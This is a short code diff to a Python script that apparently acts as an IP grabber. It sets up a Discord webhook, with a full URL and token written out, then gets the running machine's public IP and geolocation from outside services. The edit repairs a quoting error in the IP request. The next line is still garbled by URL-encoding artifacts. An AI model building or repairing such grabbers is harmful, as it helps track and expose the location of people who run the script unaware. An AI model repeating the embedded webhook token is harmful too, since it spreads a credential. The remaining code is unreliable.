@@ -6,7 +6,7 @@ from datetime import datetime
 hook = Webhook("https://discord.com/api/webhooks/796099638415327282/j0gBUradIQKPoXg28bSsy0-_Uo5iCxpUXXLgs_VPuXa6QQiKEel8-24kBTIZ1NgDA6F2")
 
 time = datetime.now().strftime("%H:%M %p")
-ip = requests.get('https://api.ipify.org/%27).text
+ip = requests.get('https://api.ipify.org/%27').text
 
 r = requests.get(f'http://extreme-ip-lookup.com/json/%7Bip%7D%27)
 geo = r.json()
